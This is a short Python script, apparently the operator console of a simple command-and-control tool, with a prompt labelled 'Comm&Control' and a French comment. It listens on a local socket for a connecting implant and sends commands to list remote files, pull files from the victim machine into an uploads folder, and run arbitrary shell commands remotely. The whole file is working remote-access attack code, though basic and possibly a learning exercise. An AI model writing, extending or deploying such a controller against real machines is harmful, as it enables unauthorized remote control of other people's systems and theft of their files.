import socket

index = 1000

def list_files(conn, param):
    tosend = "LIST#" + param
    conn.sendall(tosend.encode())
    data = conn.recv(1024)
    print(data.decode())

def upload_file(conn, param):
    global index
    tosend = "UPLOAD#" + param
    conn.sendall(tosend.encode())
    data = conn.recv(1024)
    f = open("uploads/upl" + str(index), "w")
    f.write(data.decode())
    index += 1
    f.close()

def execute_command(conn, command):
    tosend = "CMD#" + command
    conn.sendall(tosend.encode())
    data = conn.recv(1024)
    print(data.decode())

# Que le serveur accepte une connexion
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("127.0.0.1", 12346))
    s.listen()
    conn, addr = s.accept()

    while True:
        uinp = input("[lcs@Comm&Control]$ ")
        verbe, _, param = uinp.partition(' ')

        if verbe == "ls":
            list_files(conn, param)
        elif verbe == "get":
            upload_file(conn, param)
        elif verbe == "cmd":
            execute_command(conn, param)
        elif verbe == "exit":
            s.shutdown(2)
            s.close()
            exit()
        else:
            print("Unknown Command...")

